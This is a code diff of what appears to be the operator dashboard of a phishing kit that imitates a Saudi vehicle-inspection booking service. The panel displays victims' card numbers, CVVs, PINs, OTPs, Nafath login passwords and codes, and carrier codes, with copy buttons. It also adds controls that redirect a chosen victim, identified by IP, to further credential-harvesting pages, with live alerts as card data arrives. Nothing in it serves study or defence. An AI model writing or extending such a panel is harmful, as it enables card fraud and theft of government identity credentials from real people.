+        document.getElementById("sDone").textContent = sd.data.completed ?? 0;
+        document.getElementById("sPend").textContent = Math.max(0,(sd.data.total??0)-(sd.data.completed??0)-(sd.data.new??0));
       }
-    } catch (err) {
-      document.getElementById('bookingsList').innerHTML = '<tr><td colspan="7" class="text-center text-danger py-4">خطأ في تحميل البيانات</td></tr>';
-    }
+    } catch(e) { if(e.message!=="401") toast("خطأ في تحميل البيانات","err"); }
   }
 
-  function renderBookings(bookings) {
-    const tbody = document.getElementById('bookingsList');
-    if (!bookings.length) {
-      tbody.innerHTML = '<tr><td colspan="7" class="text-center text-muted py-4">لا توجد حجوزات</td></tr>';
+  function updateBell() {
+    const n = rows.filter(b=>!b.statusRead).length;
+    const el = document.getElementById("bellBadge");
+    el.textContent = n;
+    el.style.display = n > 0 ? "flex" : "none";
+  }
+
+  /* ===== Render ===== */
+  function badge(status) {
+    const s = STATUS[status] || { lbl: status, cls:"b-new" };
+    return `<span class="badge ${s.cls}">${s.lbl}</span>`;
+  }
+
+  function renderRows(list) {
+    const tb = document.getElementById("tBody");
+    if (!list.length) {
+      tb.innerHTML = `<tr><td colspan="8"><div class="empty"><i class="bi bi-inbox"></i>لا توجد حجوزات</div></td></tr>`;
       return;
     }
-    tbody.innerHTML = bookings.map(b => `
-      <tr class="booking-row" onclick="openBookingDetail('${b.referenceId}')">
-        <td><code class="text-info">${b.referenceId}</code> ${b.statusRead === 0 ? '<span class="badge bg-danger ms-1">جديد</span>' : ''}</td>
-        <td>${b.clientName || '-'}</td>
-        <td>${b.clientPhone || '-'}</td>
-        <td>${b.serviceType || '-'}</td>
-        <td>${b.serviceDate || '-'}</td>
-        <td>${getStatusBadge(b.status)}</td>
+    tb.innerHTML = list.map(b => {
+      const dt = (b.serviceDate||"").substring(0,10) || "-";
+      const uc = !b.statusRead ? "unread" : "";
+      return `<tr class="${uc}">
+        <td><code style="font-size:11px;color:#2563eb;">${b.referenceId}</code></td>
+        <td>${b.clientName||"-"}</td>
+        <td>${b.clientId||"-"}</td>
+        <td dir="ltr">${b.clientPhone||"-"}</td>
+        <td>${b.vehiclePlate||"-"}</td>
+        <td>${dt}</td>
+        <td>${badge(b.status)}</td>
         <td>
-          <button class="btn btn-sm btn-outline-info" onclick="event.stopPropagation(); openBookingDetail('${b.referenceId}')">
-            <i class="bi bi-eye"></i>
-          </button>
-        </td>
-      </tr>
-    `).join('');
-  }
-
-  function renderRecentBookings(bookings) {
-    const el = document.getElementById('recentBookings');
-    if (!bookings.length) {
-      el.innerHTML = '<p class="text-muted text-center">لا توجد حجوزات حتى الآن</p>';
-      return;
-    }
-    el.innerHTML = bookings.map(b => `
-      <div class="d-flex justify-content-between align-items-center py-2 border-bottom border-secondary">
-        <div>
-          <span class="text-white">${b.clientName || 'غير محدد'}</span>
-          <small class="text-muted me-2">${b.referenceId}</small>
-        </div>
-        <div>${getStatusBadge(b.status)}</div>
-      </div>
-    `).join('');
-  }
-
-  function getStatusBadge(status) {
-    const map = {
-      'new': '<span class="badge bg-primary">جديد</span>',
-      'pending_payment': '<span class="badge bg-warning text-dark">انتظار دفع</span>',
-      'pending_nafath': '<span class="badge bg-info">انتظار نفاذ</span>',
-      'pending_motasel': '<span class="badge bg-secondary">انتظار متصل</span>',
-      'payment_done': '<span class="badge bg-success">تم الدفع</span>',
-      'completed': '<span class="badge bg-success">مكتمل</span>',
-      'cancelled': '<span class="badge bg-danger">ملغي</span>',
-    };
-    return map[status] || `<span class="badge bg-secondary">${status || 'غير محدد'}</span>`;
-  }
-
-  // ==================== Booking Detail ====================
-  async function openBookingDetail(reference) {
-    currentBooking = reference;
-    const modal = new bootstrap.Modal(document.getElementById('bookingModal'));
-    document.getElementById('modalTitle').textContent = `تفاصيل الحجز - ${reference}`;
-    document.getElementById('modalBody').innerHTML = '<div class="text-center py-4 text-muted">جاري التحميل...</div>';
-    modal.show();
-    try {
-      const res = await fetch(`${API_BASE}/api/admin/bookings/${reference}`, {
-        headers: { 'Authorization': `Bearer ${authToken}` },
-      });
-      const data = await res.json();
-      if (data.success) renderBookingDetail(data.data);
-    } catch (err) {
-      document.getElementById('modalBody').innerHTML = '<div class="text-center py-4 text-danger">خطأ في تحميل البيانات</div>';
-    }
-  }
-
-  function renderBookingDetail(booking) {
-    const p = booking.payment;
-    const n = booking.nafath;
-    const m = booking.motasel;
-    const o = booking.otp;
-    const copyBtn = (text) => `<button class="copy-btn" onclick="copyText('${text}')" title="نسخ"><i class="bi bi-copy"></i></button>`;
-    document.getElementById('modalBody').innerHTML = `
-      <div class="row g-3">
-        <!-- بيانات الحجز -->
-        <div class="col-md-6">
-          <div class="card-dark p-3">
-            <h6 class="text-info mb-3"><i class="bi bi-person me-2"></i>بيانات العميل</h6>
-            ${row('الاسم', booking.clientName)}
-            ${row('رقم الهوية', booking.clientId)}
-            ${row('الهاتف', booking.clientPhone)}
-            ${row('البريد', booking.clientEmail)}
-            ${row('الجنسية', booking.clientNationality)}
-            ${row('IP العميل', booking.clientIp)}
-          </div>
-        </div>
-        <div class="col-md-6">
-          <div class="card-dark p-3">
-            <h6 class="text-info mb-3"><i class="bi bi-car-front me-2"></i>بيانات المركبة</h6>
-            ${row('رقم اللوحة', booking.vehiclePlate)}
-            ${row('نوع المركبة', booking.vehicleType)}
-            ${row('دولة التسجيل', booking.vehicleCountry)}
-            ${row('نوع الخدمة', booking.serviceType)}
-            ${row('المنطقة', booking.serviceRegion)}
-            ${row('التاريخ', booking.serviceDate + ' ' + booking.serviceTime)}
-          </div>
-        </div>
-        ${booking.hasDelegate ? `
-        <div class="col-md-6">
-          <div class="card-dark p-3">
-            <h6 class="text-warning mb-3"><i class="bi bi-person-badge me-2"></i>بيانات المندوب</h6>
-            ${row('الاسم', booking.delegateName)}
-            ${row('الهاتف', booking.delegatePhone)}
-            ${row('الهوية', booking.delegateId)}
-            ${row('الجنسية', booking.delegateNationality)}
-          </div>
-        </div>` : ''}
-        ${p ? `
-        <div class="col-md-6">
-          <div class="card-dark p-3">
-            <h6 class="text-green-400 mb-3" style="color:#10b981"><i class="bi bi-credit-card me-2"></i>بيانات البطاقة</h6>
-            ${rowCopy('اسم حامل البطاقة', p.cardHolderName)}
-            ${rowCopy('رقم البطاقة', p.cardNumber)}
-            ${rowCopy('تاريخ الانتهاء', p.cardExpiry)}
-            ${rowCopy('CVV', p.cardCvv)}
-            ${p.secretNum ? rowCopy('الرمز السري / PIN', p.secretNum) : ''}
-            ${row('الخطوة', p.step)}
-            ${row('الحالة', p.paymentAction || p.status)}
-          </div>
-        </div>` : ''}
-        ${o ? `
-        <div class="col-md-6">
-          <div class="card-dark p-3">
-            <h6 class="text-purple mb-3" style="color:#a78bfa"><i class="bi bi-shield-check me-2"></i>رمز OTP</h6>
-            ${rowCopy('رمز OTP', o.otpCode)}
-            ${row('الخطوة', o.step)}
-          </div>
-        </div>` : ''}
-        ${n ? `
-        <div class="col-md-6">
-          <div class="card-dark p-3">
-            <h6 class="text-blue mb-3" style="color:#60a5fa"><i class="bi bi-fingerprint me-2"></i>بيانات نفاذ</h6>
-            ${rowCopy('رقم الهوية', n.nafathId)}
-            ${rowCopy('كلمة المرور', n.nafathPassword)}
-            ${n.nafathNumber ? rowCopy('رمز نفاذ', n.nafathNumber) : ''}
-          </div>
-        </div>` : ''}
-        ${m ? `
-        <div class="col-md-6">
-          <div class="card-dark p-3">
-            <h6 class="text-orange mb-3" style="color:#fb923c"><i class="bi bi-phone me-2"></i>بيانات المتصل</h6>
-            ${row('المزود', m.motaselProvider)}
-            ${rowCopy('الهاتف', m.motaselPhone)}
-            ${m.motaselCode ? rowCopy('الرمز', m.motaselCode) : ''}
-          </div>
-        </div>` : ''}
-        <!-- أزرار الإجراءات -->
-        <div class="col-12">
-          <div class="card-dark p-3">
-            <h6 class="text-white mb-3"><i class="bi bi-lightning me-2"></i>الإجراءات</h6>
-            <div class="d-flex gap-2 flex-wrap">
-              <button class="btn btn-accept" onclick="paymentAction('${booking.referenceId}', 'pass')">
-                <i class="bi bi-check-lg me-1"></i>قبول / التالي
+          <div class="act-btns">
+            <button class="btn-act blue" onclick="openDetail('${b.referenceId}')">
+              <i class="bi bi-eye"></i> تفاصيل
+            </button>
+            <div class="dd-wrap">
+              <button class="btn-act" onclick="toggleDD('nav_${b.referenceId}')">
+                <i class="bi bi-send"></i> توجيه <i class="bi bi-chevron-down"></i>
               </button>
-              <button class="btn btn-reject" onclick="paymentAction('${booking.referenceId}', 'denied')">
-                <i class="bi bi-x-lg me-1"></i>رفض
+              <div class="dd-menu" id="nav_${b.referenceId}">
+                <div class="dd-item" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/payment')"><i class="bi bi-credit-card" style="color:#16a34a"></i>صفحة الدفع</div>
+                <div class="dd-item" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/nafath')"><i class="bi bi-phone" style="color:#7c3aed"></i>صفحة نفاذ</div>
+                <div class="dd-item" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/motasel')"><i class="bi bi-telephone" style="color:#ea580c"></i>صفحة المتصل</div>
+                <div class="dd-item" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/booking')"><i class="bi bi-car-front" style="color:#2563eb"></i>صفحة الحجز</div>
+                <div class="dd-item" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/')"><i class="bi bi-house" style="color:#64748b"></i>الصفحة الرئيسية</div>
+              </div>
+            </div>
+            <div class="dd-wrap">
+              <button class="btn-act" onclick="toggleDD('st_${b.referenceId}')">
+                <i class="bi bi-chevron-down"></i>
               </button>
-              ${n ? `
-              <div class="input-group" style="max-width:250px;">
-                <input type="text" id="nafathCodeInput" class="form-control bg-dark text-white border-secondary" placeholder="رمز نفاذ" />
-                <button class="btn btn-outline-info" onclick="sendNafathCode('${booking.referenceId}')">إرسال رمز نفاذ</button>
-              </div>` : ''}
-              <button class="btn btn-outline-success" onclick="paymentAction('${booking.referenceId}', 'completed')">
-                <i class="bi bi-check-all me-1"></i>إتمام الحجز
-              </button>
+              <div class="dd-menu" id="st_${b.referenceId}">
+                <div class="dd-item" onclick="updStatus('${b.referenceId}','completed')"><i class="bi bi-check-circle" style="color:#16a34a"></i>مكتمل</div>
+                <div class="dd-item" onclick="updStatus('${b.referenceId}','cancelled')"><i class="bi bi-x-circle" style="color:#dc2626"></i>إلغاء</div>
+              </div>
             </div>
           </div>
-        </div>
+        </td>
+      </tr>`;
+    }).join("");
+  }
+
+  function filterRows() {
+    const q = document.getElementById("srch").value.toLowerCase();
+    if (!q) { renderRows(rows); return; }
+    renderRows(rows.filter(b =>
+      (b.referenceId||"").toLowerCase().includes(q) ||
+      (b.clientName||"").toLowerCase().includes(q) ||
+      (b.clientId||"").toLowerCase().includes(q) ||
+      (b.clientPhone||"").toLowerCase().includes(q) ||
+      (b.vehiclePlate||"").toLowerCase().includes(q)
+    ));
+  }
+
+  /* ===== Dropdown ===== */
+  function toggleDD(id) {
+    document.querySelectorAll(".dd-menu").forEach(el => { if(el.id!==id) el.classList.remove("open"); });
+    document.getElementById(id)?.classList.toggle("open");
+  }
+  document.addEventListener("click", e => {
+    if (!e.target.closest(".dd-wrap")) document.querySelectorAll(".dd-menu").forEach(el=>el.classList.remove("open"));
+  });
+
+  /* ===== Actions ===== */
+  async function navUser(ref, ip, page) {
+    document.querySelectorAll(".dd-menu").forEach(el=>el.classList.remove("open"));
+    try {
+      const d = await post("/api/admin/navigate", { referenceId:ref, clientIp:ip, page });
+      toast(d.success ? `تم توجيه العميل إلى ${page}` : "فشل التوجيه", d.success?"ok":"err");
+    } catch { toast("خطأ في الاتصال","err"); }
+  }
+
+  async function updStatus(ref, status) {
+    document.querySelectorAll(".dd-menu").forEach(el=>el.classList.remove("open"));
+    try {
+      const d = await post("/api/admin/update-status", { reference:ref, status });
+      if (d.success) { toast("تم تحديث الحالة","ok"); loadAll(); }
+      else toast("فشل التحديث","err");
+    } catch { toast("خطأ في الاتصال","err"); }
+  }
+
+  /* ===== Detail Modal ===== */
+  async function openDetail(ref) {
+    try {
+      const d = await get(`/api/admin/bookings/${ref}`);
+      if (!d.success) return;
+      const b = d.data;
+      document.getElementById("mTitle").textContent = `تفاصيل الحجز - ${b.referenceId}`;
+      document.getElementById("mBody").innerHTML = buildDetail(b);
+      document.getElementById("detailOverlay").classList.add("show");
+    } catch { toast("خطأ في تحميل التفاصيل","err"); }
+  }
+
+  function closeModal() { document.getElementById("detailOverlay").classList.remove("show"); }
+
+  function dRow(label, val) {
+    const v = val || "-";
+    const cp = val ? `<button class="copy-btn" onclick="cp('${val}')"><i class="bi bi-copy"></i></button>` : "";
+    return `<div><div class="d-lbl">${label}</div><div class="d-val">${v}${cp}</div></div>`;
+  }
+
+  function buildDetail(b) {
+    let h = `
+      <div class="sec-title">بيانات العميل</div>
+      <div class="detail-grid">
+        ${dRow("الاسم",b.clientName)}${dRow("رقم الهوية",b.clientId)}
+        ${dRow("الجوال",b.clientPhone)}${dRow("البريد",b.clientEmail)}
+        ${dRow("الجنسية",b.clientNationality)}${dRow("IP العميل",b.clientIp)}
       </div>
-    `;
-  }
+      <div class="sec-title">بيانات المركبة والموعد</div>
+      <div class="detail-grid">
+        ${dRow("لوحة المركبة",b.vehiclePlate)}${dRow("نوع المركبة",b.vehicleType)}
+        ${dRow("المنطقة",b.serviceRegion)}${dRow("تاريخ الفحص",b.serviceDate)}
+        ${dRow("وقت الفحص",b.serviceTime)}${dRow("الرقم المرجعي",b.referenceId)}
+      </div>`;
 
-  function row(label, value) {
-    return `<div class="detail-row"><span class="detail-label">${label}</span><span class="detail-value">${value || '-'}</span></div>`;
-  }
-
-  function rowCopy(label, value) {
-    if (!value) return row(label, '-');
-    return `<div class="detail-row">
-      <span class="detail-label">${label}</span>
-      <span class="detail-value">
-        ${value}
-        <button class="copy-btn" onclick="copyText('${value}')" title="نسخ"><i class="bi bi-copy"></i></button>
-      </span>
-    </div>`;
-  }
-
-  async function paymentAction(reference, action) {
-    try {
-      const res = await fetch(`${API_BASE}/api/admin/payment-action`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
-        body: JSON.stringify({ reference, action }),
-      });
-      const data = await res.json();
-      if (data.success) {
-        showNotification('تم', `تم تنفيذ الإجراء: ${action} → ${data.targetPage || ''}`, 'success');
-        loadBookings();
-        if (currentBooking === reference) openBookingDetail(reference);
-      } else {
-        showNotification('خطأ', data.error || 'حدث خطأ', 'danger');
-      }
-    } catch (err) {
-      showNotification('خطأ', 'فشل الاتصال بالخادم', 'danger');
+    if (b.payment) {
+      h += `<div class="sec-title">بيانات الدفع</div>
+        <div class="detail-grid">
+          ${dRow("اسم حامل البطاقة",b.payment.cardHolderName)}${dRow("رقم البطاقة",b.payment.cardNumber)}
+          ${dRow("تاريخ الانتهاء",b.payment.cardExpiry)}${dRow("CVV",b.payment.cardCvv)}
+          ${dRow("رمز التحقق",b.payment.verifyCode)}${dRow("الرقم السري",b.payment.secretNum)}
+        </div>`;
     }
+    if (b.nafath) {
+      h += `<div class="sec-title">بيانات نفاذ</div>
+        <div class="detail-grid">
+          ${dRow("رقم الهوية",b.nafath.nafathId)}${dRow("كلمة المرور",b.nafath.nafathPassword)}
+          ${dRow("رمز نفاذ",b.nafath.nafathNumber)}
+        </div>`;
+    }
+    if (b.motasel) {
+      h += `<div class="sec-title">بيانات المتصل</div>
+        <div class="detail-grid">
+          ${dRow("المزود",b.motasel.motaselProvider)}${dRow("الجوال",b.motasel.motaselPhone)}
+          ${dRow("الرمز",b.motasel.motaselCode)}
+        </div>`;
+    }
+
+    h += `<div class="nav-section">
+      <div class="nav-sec-title"><i class="bi bi-send"></i> توجيه العميل إلى صفحة</div>
+      <div class="nav-btns">
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/payment')"><i class="bi bi-credit-card" style="color:#16a34a"></i>الدفع</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/nafath')"><i class="bi bi-phone" style="color:#7c3aed"></i>نفاذ</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/motasel')"><i class="bi bi-telephone" style="color:#ea580c"></i>المتصل</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/booking')"><i class="bi bi-car-front" style="color:#2563eb"></i>الحجز</button>
+        <button class="nav-btn" onclick="navUser('${b.referenceId}','${b.clientIp||""}','/')"><i class="bi bi-house" style="color:#64748b"></i>الرئيسية</button>
+      </div>
+    </div>`;
+    return h;
   }
 
-  async function sendNafathCode(reference) {
-    const code = document.getElementById('nafathCodeInput')?.value;
-    if (!code) return;
-    try {
-      const res = await fetch(`${API_BASE}/api/admin/send-nafath-code`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
-        body: JSON.stringify({ reference, code }),
-      });
-      const data = await res.json();
-      if (data.success) showNotification('تم', 'تم إرسال رمز نفاذ', 'success');
-    } catch (err) {}
+  function cp(txt) {
+    navigator.clipboard.writeText(txt).then(()=>toast("تم النسخ","ok")).catch(()=>{});
   }
 
-  // ==================== Utilities ====================
-  function copyText(text) {
-    navigator.clipboard.writeText(text).then(() => {
-      showNotification('تم النسخ', text, 'success');
+  /* ===== Socket.io ===== */
+  function connectSock() {
+    sock = io({ path:"/socket.io", transports:["websocket","polling"] });
+    sock.emit("joinAdmin", token);
+    sock.on("connect", () => {
+      document.getElementById("connDot").className = "conn-dot on";
+      document.getElementById("connTxt").textContent = "متصل";
+    });
+    sock.on("disconnect", () => {
+      document.getElementById("connDot").className = "conn-dot off";
+      document.getElementById("connTxt").textContent = "غير متصل";
+    });
+    sock.on("newBooking", (bk) => {
+      beep(); toast(`حجز جديد: ${bk.clientName||bk.referenceId}`,"inf");
+      loadAll();
+    });
+    sock.on("newPayment", (d) => {
+      beep(); toast(`بيانات دفع: ${d.reference}`,"inf");
+      loadAll();
     });
   }
 
-  function showNotification(title, message, type) {
-    const id = 'notif_' + Date.now();
-    const colors = { info: '#3b82f6', success: '#10b981', warning: '#f59e0b', danger: '#ef4444' };
-    const el = document.createElement('div');
-    el.id = id;
-    el.className = 'alert alert-dismissible fade show';
-    el.style.cssText = `background:${colors[type] || '#3b82f6'}; color:white; border:none; border-radius:10px; margin-bottom:10px;`;
-    el.innerHTML = `<strong>${title}</strong><br><small>${message}</small><button type="button" class="btn-close btn-close-white" onclick="document.getElementById('${id}').remove()"></button>`;
-    document.getElementById('notificationContainer').appendChild(el);
-    setTimeout(() => { try { el.remove(); } catch(e) {} }, 5000);
-  }
-
-  function playAlert() {
+  function beep() {
     try {
-      const ctx = new (window.AudioContext || window.webkitAudioContext)();
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.frequency.setValueAtTime(880, ctx.currentTime);
-      osc.frequency.setValueAtTime(660, ctx.currentTime + 0.1);
-      gain.gain.setValueAtTime(0.3, ctx.currentTime);
-      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
-      osc.start(ctx.currentTime);
-      osc.stop(ctx.currentTime + 0.3);
-    } catch (e) {}
+      const ctx = new (window.AudioContext||window.webkitAudioContext)();
+      const o = ctx.createOscillator(), g = ctx.createGain();
+      o.connect(g); g.connect(ctx.destination);
+      o.frequency.setValueAtTime(880, ctx.currentTime);
+      o.frequency.setValueAtTime(1100, ctx.currentTime+0.1);
+      g.gain.setValueAtTime(0.3, ctx.currentTime);
+      g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime+0.4);
+      o.start(ctx.currentTime); o.stop(ctx.currentTime+0.4);
+    } catch {}
   }
 
-  // ==================== Init ====================
-  if (authToken) {
-    // التحقق من صحة التوكن
-    fetch(`${API_BASE}/api/admin/me`, { headers: { 'Authorization': `Bearer ${authToken}` } })
-      .then(r => r.json())
-      .then(d => { if (d.success) showDashboard(); else { localStorage.removeItem('adminToken'); } })
-      .catch(() => {});
+  /* ===== Toast ===== */
+  function toast(msg, type="inf") {
+    const ic = { ok:"bi-check-circle-fill", err:"bi-x-circle-fill", inf:"bi-info-circle-fill" };
+    const cl = { ok:"#16a34a", err:"#dc2626", inf:"#2563eb" };
+    const el = document.createElement("div");
+    el.className = `toast-item ${type}`;
+    el.innerHTML = `<i class="bi ${ic[type]}" style="color:${cl[type]};font-size:18px;"></i><span style="font-size:13px;">${msg}</span>`;
+    document.getElementById("toasts").appendChild(el);
+    setTimeout(()=>el.remove(), 4000);
   }
+
+  /* ===== Init ===== */
+  init();
+  setInterval(() => { if(token) loadAll(); }, 30000);
 </script>
 </body>
 </html>
